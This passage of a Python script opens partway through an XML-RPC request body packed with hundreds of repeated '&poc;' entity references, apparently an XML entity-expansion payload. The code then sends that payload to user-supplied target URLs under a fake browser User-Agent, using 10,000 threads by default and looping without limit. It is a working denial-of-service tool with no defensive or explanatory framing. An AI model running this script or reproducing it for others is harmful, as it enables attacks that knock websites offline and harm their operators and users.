c;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;</methodName>
  <params>
   <param><value>aa</value></param>
   <param><value>aa</value></param>
  </params>
</methodCall>"""


def get_request(url):
    """Build a request object for specified URL"""
    req = urllib2.Request(to_idn(url), DATA)
    req.add_header(b'Accept', '*/*')
    req.add_header(b'User-Agent',
                   'Mozilla/5.0 (Wihndows NT 6.1; WOW64; rv:28.0) Gecko/20100101 Firefox/28.0')
    req.add_header(b'Connection', '')
    req.add_header(b'Content-type', 'text/xml')
    return req, url


def worker(name, requests, loops):
    print("{} started!".format(name))
    while True:
        req, url = next(requests)
        print("{}: send data to {}".format(name, url))
        if loops:
            loops -= 1
            if loops <= 0:
                print("{} finished!".format(name))
                return
        try:
            urllib2.urlopen(req)
            # Pretend to work for a while
            time.sleep(.2)
        except Exception as err:
            print(url, err)
        finally:
            print("{} finished a request".format(name))



def to_idn(url):
    """Convert cyrillic domains to idna

    Based on this recipe
    http://xn--80afqpaigicolm.xn--p1ai/python/parsing-saitov-rf-na-python/

    """
    try:
        url = url.decode(sys.stdin.encoding)
    except AttributeError:
        pass

    parts = list(urlparse.urlparse(url, scheme='http'))
    if not parts[1]:
        # Swap netloc and path if netloc is omitted
        parts[1:3] = parts[2:0:-1]
    parts[0] = parts[0].encode('utf-8')
    parts[1] = parts[1].encode('idna')
    parts[2:] = [quote(s.encode('utf-8')) for s in parts[2:]]
    return urlparse.urlunparse(parts).decode('utf-8')


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter)

    parser.add_argument('urls', nargs='+', help='space-separated target URLs')
    parser.add_argument('-t', '--threads', default=10000, type=int,
                        help='Number of working threads. '
                             'Default is %(default)s')
    parser.add_argument('--loops', type=int,
                        help='Number of repetitions. '
                             'Default is 0 (unlimited)')
    args = parser.parse_args()
    for url in args.urls:
        requests = cycle([get_request(u) for u in args.urls])

        threads = []
        for i in range(args.threads):
            name = "Thread-{}".format(i)
            print(name)
            thread = Thread(name=name,
                            target=worker,
                            args=(name, requests, args.loops))
            thread.start()

        for thread in threads:
            thread.join()
